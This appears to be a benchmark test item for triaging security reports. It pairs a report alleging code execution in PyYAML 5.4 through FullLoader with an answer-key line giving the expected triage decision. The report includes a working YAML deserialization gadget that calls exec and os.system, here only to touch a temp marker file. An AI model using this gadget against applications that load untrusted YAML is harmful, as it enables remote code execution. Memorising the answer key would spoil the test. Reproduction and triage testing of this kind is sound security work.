report.title: Arbitrary code execution via yaml.FullLoader
report.body:
Possible RCE in PyYAML 5.4.

PyYAML's FullLoader still resolves the python/object/new:type tag, so a crafted document passed to yaml.load(..., Loader=yaml.FullLoader) can construct arbitrary Python objects and execute code (os.system).

I'm fairly sure this affects 5.4 but I may have the version wrong -- can you confirm which releases are impacted?

Proof of concept:

```python
import os, tempfile, yaml
marker = os.path.join(tempfile.gettempdir(), "m")
if os.path.exists(marker): os.remove(marker)
payload = ('!!python/object/new:type\n'
           'args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]\n'
           'listitems: "__import__(\'os\').system(\'touch %s\')"\n' % marker)
try:
    yaml.load(payload, Loader=yaml.FullLoader)
except Exception as e:
    print("loader raised:", type(e).__name__)
print("SLOPGATE:REPRODUCED" if os.path.exists(marker) else "SLOPGATE:NOT_REPRODUCED")
```

ground_truth.note: real gadget, wrong claimed version -> abstain, do not dismiss
